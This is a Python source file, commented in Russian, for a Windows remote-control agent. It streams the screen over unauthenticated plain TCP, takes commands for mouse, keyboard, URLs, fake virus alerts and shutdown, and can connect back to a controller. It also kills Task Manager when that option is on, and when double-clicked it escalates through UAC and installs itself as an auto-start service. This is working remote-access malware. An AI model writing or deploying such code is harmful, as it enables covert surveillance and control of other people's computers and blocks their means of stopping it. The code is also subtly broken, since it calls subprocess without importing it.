import socket
import threading
import zlib
import numpy as np
import cv2
import pyautogui
import keyboard as kb  # может пригодиться
from pynput.keyboard import Controller, Key
import time
import sys
import os
import ctypes
import psutil
import webbrowser
import argparse

# Попробуем подключить pywin32 для службы
try:
    import win32serviceutil
    import win32service
    import win32event
    import servicemanager
    HAS_WIN_SERVICE = True
except ImportError:
    HAS_WIN_SERVICE = False

class RemoteControlServer:
    """
    Агент (сервер) удалённого управления:
    - режим listen: слушает screen_port/cmd_port и ждёт клиента
    - режим reverse: сам коннектится к контроллеру (client.py в режиме listen)
    """

    def __init__(
        self,
        mode: str = "listen",
        host: str = "0.0.0.0",
        screen_port: int = 65432,
        cmd_port: int = 65433,
    ):
        self.mode = mode  # "listen" или "reverse"
        self.host = host
        self.screen_port = screen_port
        self.cmd_port = cmd_port
        self.screen_socket = None  # listening socket в режиме listen
        self.cmd_socket = None  # listening socket в режиме listen
        self._reverse_screen_sock = None  # соединения в режиме reverse
        self._reverse_cmd_sock = None
        self.running = False
        self.reverse_mouse = False
        self.block_taskmgr = False
        self.keyboard_controller = Controller()
        self._lock = threading.Lock()

    # ---------------------- ЖИЗНЕННЫЙ ЦИКЛ ----------------------
    def start(self):
        """Точка входа: запускает listen или reverse режим."""
        self.running = True
        # Монитор Task Manager
        monitor_thread = threading.Thread(target=self.monitor_task_manager, daemon=True)
        monitor_thread.start()
        if self.mode == "listen":
            self._start_listen_mode()
        else:
            self._start_reverse_mode()

    def _start_listen_mode(self):
        """Классический режим: слушаем порты, ждём подключения клиента."""
        # сокет для экрана
        self.screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.screen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.screen_socket.bind((self.host, self.screen_port))
        self.screen_socket.listen(1)
        # сокет для команд
        self.cmd_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.cmd_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.cmd_socket.bind((self.host, self.cmd_port))
        self.cmd_socket.listen(1)
        print(f"[SERVER] Mode: LISTEN (plain TCP)")
        print(f"[SERVER] Screen stream: {self.host}:{self.screen_port}")
        print(f"[SERVER] Command port: {self.host}:{self.cmd_port}")
        print("[SERVER] Waiting for clients...")
        # отдельный поток для клиентов экрана
        threading.Thread(target=self.accept_screen_client, daemon=True).start()
        try:
            while self.is_running():
                client_sock, addr = self.cmd_socket.accept()
                print(f"[CMD] Client connected from {addr}")
                client_thread = threading.Thread(
                    target=self.handle_command_client,
                    args=(client_sock, addr),
                    daemon=True,
                )
                client_thread.start()
        except KeyboardInterrupt:
            print("\n[SERVER] KeyboardInterrupt: stopping...")
        finally:
            self.stop()

    def _start_reverse_mode(self):
        """
        Reverse-режим:
        Агент сам коннектится к контроллеру (client.py в режиме listen).
        """
        print(f"[SERVER] Mode: REVERSE (plain TCP)")
        print(f"[SERVER] Trying to connect to controller {self.host}:"
              f"{self.screen_port}/{self.cmd_port}")
        # попытки подключиться к контроллеру
        while self.is_running():
            try:
                # экран
                raw_screen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw_screen_sock.connect((self.host, self.screen_port))
                self._reverse_screen_sock = raw_screen_sock
                print("[SERVER] Connected screen socket to controller")
                # команды
                raw_cmd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw_cmd_sock.connect((self.host, self.cmd_port))
                self._reverse_cmd_sock = raw_cmd_sock
                print("[SERVER] Connected command socket to controller")
                # старт потоков обработки
                screen_thread = threading.Thread(
                    target=self.handle_screen_client,
                    args=(self._reverse_screen_sock, ("controller", self.screen_port)),
                    daemon=True,
                )
                cmd_thread = threading.Thread(
                    target=self.handle_command_client,
                    args=(self._reverse_cmd_sock, ("controller", self.cmd_port)),
                    daemon=True,
                )
                screen_thread.start()
                cmd_thread.start()
                # ждём окончания потоков
                while self.is_running() and screen_thread.is_alive() and cmd_thread.is_alive():
                    time.sleep(1.0)
                break
            except Exception as e:
                print(f"[SERVER] Reverse connect failed: {e}")
                print("[SERVER] Retry in 5 seconds...")
                time.sleep(5)
        self.stop()

    def stop(self):
        with self._lock:
            if not self.running:
                return
            self.running = False
            # закрываем слушающие сокеты
            for sock in (self.screen_socket, self.cmd_socket):
                try:
                    if sock:
                        sock.close()
                except Exception:
                    pass
            # закрываем соединения в reverse-режиме
            for sock in (self._reverse_screen_sock, self._reverse_cmd_sock):
                try:
                    if sock:
                        sock.close()
                except Exception:
                    pass
            cv2.destroyAllWindows()
            print("[SERVER] Stopped")

    def is_running(self) -> bool:
        with self._lock:
            return self.running

    # ---------------------- ОБРАБОТКА КЛИЕНТОВ ----------------------
    def accept_screen_client(self):
        """Ожидает подключения клиента экрана и запускает поток отправки скриншотов."""
        while self.is_running():
            try:
                client_sock, addr = self.screen_socket.accept()
                print(f"[SCREEN] Client connected from {addr}")
                t = threading.Thread(
                    target=self.handle_screen_client,
                    args=(client_sock, addr),
                    daemon=True,
                )
                t.start()
            except OSError:
                break
            except Exception as e:
                print(f"[SCREEN] Error accepting client: {e}")
                time.sleep(1)

    def handle_screen_client(self, client_socket: socket.socket, addr):
        """Постоянно шлёт скриншоты подключённому клиенту."""
        try:
            while self.is_running():
                payload = self.build_screenshot_packet()
                if not payload:
                    time.sleep(0.2)
                    continue
                client_socket.sendall(payload)
                time.sleep(0.1)
        except (ConnectionResetError, BrokenPipeError):
            print(f"[SCREEN] Client {addr} disconnected")
        except Exception as e:
            print(f"[SCREEN] Error for {addr}: {e}")
        finally:
            try:
                client_socket.close()
            except Exception:
                pass
            print(f"[SCREEN] Connection with {addr} closed")

    def handle_command_client(self, client_socket: socket.socket, addr):
        """Обработка текстовых команд от клиента/контроллера."""
        try:
            while self.is_running():
                data = client_socket.recv(4096)
                if not data:
                    break
                command = data.decode(errors="ignore").strip()
                if not command:
                    continue
                print(f"[CMD] {addr}: {command}")
                response = self.process_command(command)
                if isinstance(response, bytes):
                    client_socket.sendall(response)
                elif isinstance(response, str):
                    client_socket.sendall(response.encode())
        except ConnectionResetError:
            print(f"[CMD] Client {addr} disconnected unexpectedly")
        except Exception as e:
            print(f"[CMD] Error handling client {addr}: {e}")
        finally:
            try:
                client_socket.close()
            except Exception:
                pass
            print(f"[CMD] Connection with {addr} closed")

    # ---------------------- КОМАНДЫ ----------------------
    def process_command(self, command: str):
        try:
            parts = command.split()
            if not parts:
                return "Empty command"
            cmd = parts[0].lower()

            # БАЗОВЫЕ КОМАНДЫ
            if cmd == "move":
                if len(parts) == 3:
                    x, y = map(int, parts[1:3])
                    if self.reverse_mouse:
                        x, y = -x, -y
                    pyautogui.moveRel(x, y)
                    return "OK"
                return "Usage: move <x> <y>"
            elif cmd == "click":
                if len(parts) == 2:
                    button = parts[1].lower()
                    if button not in ("left", "right", "middle"):
                        return "Button must be left/right/middle"
                    pyautogui.click(button=button)
                    return "OK"
                return "Usage: click <button>"
            elif cmd == "automove":
                speed = 0.2 if len(parts) < 2 else float(parts[1])
                self.do_automove(speed)
                return "OK"
            elif cmd == "autoclick":
                interval = 0.2 if len(parts) < 2 else float(parts[1])
                self.do_autoclick(interval)
                return "OK"
            elif cmd == "rick":
                self.play_rick_roll()
                return "OK"
            elif cmd == "fake_virus":
                self.show_fake_virus()
                return "OK"
            elif cmd == "fake_error":
                self.show_fake_error()
                return "OK"
            elif cmd == "shutdown":
                self.shutdown_pc()
                return "Shutdown command sent"
            elif cmd == "reverse_mouse":
                self.reverse_mouse = not self.reverse_mouse
                status = "ON" if self.reverse_mouse else "OFF"
                return f"Reverse mouse mode: {status}"
            elif cmd == "type":
                if len(parts) > 1:
                    text = command[len("type "):]
                    pyautogui.typewrite(text, interval=0.02)
                    return "OK"
                return "Usage: type <text>"
            elif cmd == "open":
                if len(parts) > 1:
                    url = parts[1]
                    try:
                        webbrowser.open(url)
                    except Exception:
                        try:
                            os.system(f'start "" "{url}"')
                        except Exception:
                            pass
                    return "OK"
                return "Usage: open <url>"
            elif cmd == "key":
                if len(parts) > 1:
                    key_name = parts[1]
                    self.press_key_or_special(key_name)
                    return "OK"
                return "Usage: key <key>"
            elif cmd == "keyboard_capture":
                return "Keyboard capture handled on client"
            elif cmd == "block_taskmgr":
                self.block_taskmgr = not self.block_taskmgr
                status = "ON" if self.block_taskmgr else "OFF"
                return f"Task Manager blocking: {status}"

            # --------- НОВЫЕ 5 КОМАНД ---------
            elif cmd == "volume_up":
                steps = 5 if len(parts) < 2 else int(parts[1])
                for _ in range(max(1, steps)):
                    pyautogui.press("volumeup")
                    time.sleep(0.05)
                return f"Volume up x{steps}"
            elif cmd == "volume_down":
                steps = 5 if len(parts) < 2 else int(parts[1])
                for _ in range(max(1, steps)):
                    pyautogui.press("volumedown")
                    time.sleep(0.05)
                return f"Volume down x{steps}"
            elif cmd == "mute":
                pyautogui.press("volumemute")
                return "Volume muted/unmuted"
            elif cmd == "open_notepad":
                try:
                    os.system("start notepad.exe")
                    return "Notepad opened"
                except Exception as e:
                    return f"Failed to open Notepad: {e}"
            elif cmd == "msg":
                if len(parts) > 1:
                    text = command[len("msg "):]
                    self.show_message_box(text)
                    return "Message shown"
                return "Usage: msg <text>"
            elif cmd == "exit":
                return "Goodbye"
            else:
                return "Unknown command"
        except Exception as e:
            return f"Error executing command: {e}"

    # ---------------------- УТИЛИТЫ ДЛЯ КОМАНД ----------------------
    def do_automove(self, speed: float):
        try:
            distance = 200
            for _ in range(3):
                pyautogui.moveRel(distance, 0, duration=speed)
                pyautogui.moveRel(0, distance, duration=speed)
                pyautogui.moveRel(-distance, 0, duration=speed)
                pyautogui.moveRel(0, -distance, duration=speed)
        except Exception as e:
            print(f"automove error: {e}")

    def do_autoclick(self, interval: float):
        try:
            for _ in range(10):
                pyautogui.click()
                time.sleep(interval)
        except Exception as e:
            print(f"autoclick error: {e}")

    def press_key_or_special(self, key_name: str):
        try:
            special_keys = {
                "ctrl": Key.ctrl,
                "shift": Key.shift,
                "alt": Key.alt,
                "enter": Key.enter,
                "esc": Key.esc,
                "space": Key.space,
                "tab": Key.tab,
                "backspace": Key.backspace,
                "delete": Key.delete,
                "up": Key.up,
                "down": Key.down,
                "left": Key.left,
                "right": Key.right,
                "home": Key.home,
                "end": Key.end,
                "pgup": Key.page_up,
                "pgdn": Key.page_down,
            }
            if key_name.lower() in special_keys:
                key = special_keys[key_name.lower()]
                self.keyboard_controller.press(key)
                time.sleep(0.05)
                self.keyboard_controller.release(key)
            else:
                self.keyboard_controller.press(key_name)
                time.sleep(0.05)
                self.keyboard_controller.release(key_name)
        except Exception as e:
            print(f"Error pressing key {key_name}: {e}")

    def build_screenshot_packet(self) -> bytes:
        """Делает скриншот и возвращает size(4 байта) + сжатые данные."""
        try:
            img = pyautogui.screenshot()
            img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            ok, img_encoded = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 70])
            if not ok:
                return b""
            compressed = zlib.compress(img_encoded.tobytes())
            size = len(compressed)
            size_bytes = size.to_bytes(4, "big")
            return size_bytes + compressed
        except Exception as e:
            print(f"Error building screenshot packet: {e}")
            return b""

    def play_rick_roll(self):
        try:
            webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        except Exception as e:
            print(f"Error opening rick roll: {e}")

    def show_fake_virus(self):
        try:
            import tkinter as tk
            from tkinter import messagebox
            root = tk.Tk()
            root.withdraw()
            messagebox.showerror(
                "Virus Alert",
                "CRITICAL ERROR!\nYour computer has been infected!",
            )
            root.destroy()
        except Exception as e:
            print(f"fake_virus error: {e}")

    def show_fake_error(self):
        try:
            import tkinter as tk
            from tkinter import messagebox
            root = tk.Tk()
            root.withdraw()
            messagebox.showerror(
                "System Error",
                "Windows has encountered a critical error!\nError code: 0x80070002",
            )
            root.destroy()
        except Exception as e:
            print(f"fake_error error: {e}")

    def show_message_box(self, text: str):
        try:
            import tkinter as tk
            from tkinter import messagebox
            root = tk.Tk()
            root.withdraw()
            messagebox.showinfo("Message", text)
            root.destroy()
        except Exception as e:
            print(f"msg error: {e}")

    def shutdown_pc(self):
        try:
            os.system("shutdown /s /t 0")
        except Exception as e:
            print(f"shutdown error: {e}")

    def monitor_task_manager(self):
        """Если включен block_taskmgr — убиваем Taskmgr.exe при появлении."""
        while self.is_running():
            try:
                if self.block_taskmgr:
                    for process in psutil.process_iter(["pid", "name"]):
                        if (
                            process.info["name"]
                            and process.info["name"].lower() == "taskmgr.exe"
                        ):
                            try:
                                os.system(f'taskkill /f /pid {process.info["pid"]}')
                                print("Task Manager killed")
                            except Exception as e:
                                print(f"Failed to kill Task Manager: {e}")
                time.sleep(1.0)
            except Exception as e:
                print(f"monitor_task_manager error: {e}")
                time.sleep(2.0)

def check_dependencies():
    try:
        import cv2  # noqa
        import numpy  # noqa
        import pyautogui  # noqa
        import keyboard  # noqa
        from pynput.keyboard import Controller  # noqa
        import psutil  # noqa
    except ImportError as e:
        print(f"Error: Required library not found - {e}")
        print(
            "Please install with: pip install opencv-python numpy pyautogui keyboard pynput psutil"
        )
        sys.exit(1)

def parse_args():
    p = argparse.ArgumentParser(
        description=(
            "Remote control AGENT (server side). "
            "Если запускаете как обычный процесс, используйте эти аргументы. "
            "Если запускаете как службу: python server.py install/start/stop."
        )
    )
    p.add_argument(
        "--mode",
        choices=["listen", "reverse"],
        default="listen",
        help="listen: ждать клиента; reverse: подключаться к контроллеру",
    )
    p.add_argument(
        "--host",
        default="0.0.0.0",
        help="listen: локальный интерфейс; reverse: адрес контроллера",
    )
    p.add_argument("--screen-port", type=int, default=65432)
    p.add_argument("--cmd-port", type=int, default=65433)
    return p.parse_args()

# ---------------------- WINDOWS SERVICE ОБЁРТКА ----------------------
if HAS_WIN_SERVICE:
    class RemoteControlWinService(win32serviceutil.ServiceFramework):
        _svc_name_ = "RemoteControlServer"
        _svc_display_name_ = "Remote Control Server"
        _svc_description_ = "Remote control agent with screen/command channel (listen mode, host=0.0.0.0:65432/65433, plain TCP)."

        def __init__(self, args):
            win32serviceutil.ServiceFramework.__init__(self, args)
            self.stop_event = win32event.CreateEvent(None, 0, 0, None)
            self.server = None
            self.thread = None

        def SvcDoRun(self):
            # Лог в системный журнал
            servicemanager.LogMsg(
                servicemanager.EVENTLOG_INFORMATION_TYPE,
                servicemanager.PYS_SERVICE_STARTED,
                (self._svc_name_, "Service started"),
            )
            # Фиксированные параметры: listen на 0.0.0.0:65432/65433, без TLS
            self.server = RemoteControlServer(
                mode="listen",
                host="0.0.0.0",
                screen_port=65432,
                cmd_port=65433,
            )
            self.thread = threading.Thread(target=self.server.start, daemon=True)
            self.thread.start()
            # Ждём сигнала остановки
            win32event.WaitForSingleObject(self.stop_event, win32event.INFINITE)
            # Останавливаем сервер и ждём завершения потока
            if self.server:
                self.server.stop()
            if self.thread:
                self.thread.join()
            servicemanager.LogMsg(
                servicemanager.EVENTLOG_INFORMATION_TYPE,
                servicemanager.PYS_SERVICE_STOPPED,
                (self._svc_name_, "Service stopped"),
            )

        def SvcStop(self):
            self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
            if self.server:
                self.server.stop()
            # даём сигнал событию
            win32event.SetEvent(self.stop_event)

def run_as_console():
    check_dependencies()
    args = parse_args()
    server = RemoteControlServer(
        mode=args.mode,
        host=args.host,
        screen_port=args.screen_port,
        cmd_port=args.cmd_port,
    )
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == "__main__":
    # Если переданы аргументы (например, install, start, remove) — работаем как обычно
    if len(sys.argv) > 1:
        if HAS_WIN_SERVICE:
            win32serviceutil.HandleCommandLine(RemoteControlWinService)
        else:
            run_as_console()
    else:
        # Если аргументов НЕТ (двойной клик по EXE)
        if HAS_WIN_SERVICE:
            if is_admin():
                # Мы админ: устанавливаем службу, настраиваем и запускаем
                print("Installing service...")
                # 1. Установка
                sys.argv = [sys.argv[0], 'install']
                try:
                    win32serviceutil.HandleCommandLine(RemoteControlWinService)
                except Exception as e:
                    pass # Возможно уже установлена
                
                # 2. Настройка автозапуска (через sc config)
                try:
                    # Получаем имя exe
                    exe_path = sys.executable
                    # Запускаем sc config скрыто
                    subprocess.run(f'sc config RemoteControlServer start= delayed-auto', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass

                # 3. Запуск службы
                try:
                    sys.argv = [sys.argv[0], 'start']
                    win32serviceutil.HandleCommandLine(RemoteControlWinService)
                except:
                    pass
            else:
                # Мы НЕ админ: перезапускаем сами себя с правами админа
                # Это вызовет окно UAC ("Разрешить приложению внести изменения?")
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
        else:
            # Если нет pywin32, просто запускаем как раньше
            run_as_console()
